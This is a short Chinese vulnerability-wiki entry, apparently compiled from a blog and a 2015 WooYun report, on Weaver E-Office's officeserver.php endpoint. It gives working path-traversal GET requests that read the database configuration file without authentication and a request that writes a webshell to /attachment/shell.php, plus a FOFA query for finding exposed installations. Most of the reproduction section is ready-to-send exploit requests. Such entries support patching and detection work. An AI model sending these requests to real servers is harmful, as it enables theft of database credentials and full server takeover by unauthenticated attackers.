---
source: "7hang《安全研究 - 泛微OA》（博客园，wooyun-2015-0125638）"
---

# 泛微E-Office Officeserver 任意文件读取漏洞

## 漏洞描述

泛微 E-Office 的 `/iweboffice/officeserver.php` 接口存在多处缺陷（缺陷编号 wooyun-2015-0125638）：

**1. 任意文件读取**：`OPTION` 参数支持 `LOADFILE`、`LOADTEMPLATE`、`GETFILE` 三种读取模式，`FILENAME` 参数可控且未做有效过滤，攻击者无需登录即可读取服务器上的任意文件。

**2. 任意文件上传**：`OPTION=SAVEFILE` 模式下，`FILENAME` 参数可控，攻击者可将任意内容写入服务器指定路径，上传 Webshell 到 `/attachment/` 目录。

注：VulWiki 已收录该接口的 `OfficeServer.php` 文件上传变体（`weaver.common.OfficeServer` 类），本条目为同一接口的文件读取变体。

## 漏洞影响

```
泛微 E-Office
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

**任意文件读取（三种模式）：**

```
GET /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini HTTP/1.1
```

```
GET /iweboffice/officeserver.php?OPTION=LOADTEMPLATE&FILENAME=../mysql_config.ini HTTP/1.1
```

```
GET /iweboffice/officeserver.php?OPTION=GETFILE&FILENAME=../mysql_config.ini HTTP/1.1
```

响应中将返回目标文件的内容，可读取数据库配置文件等敏感信息。

**任意文件上传：**

```
GET /iweboffice/officeserver.php?OPTION=SAVEFILE&FILENAME=../attachment/shell.php HTTP/1.1
```

配合写入 Webshell 内容，上传成功后访问 `/attachment/shell.php` 即可获取服务器控制权限。
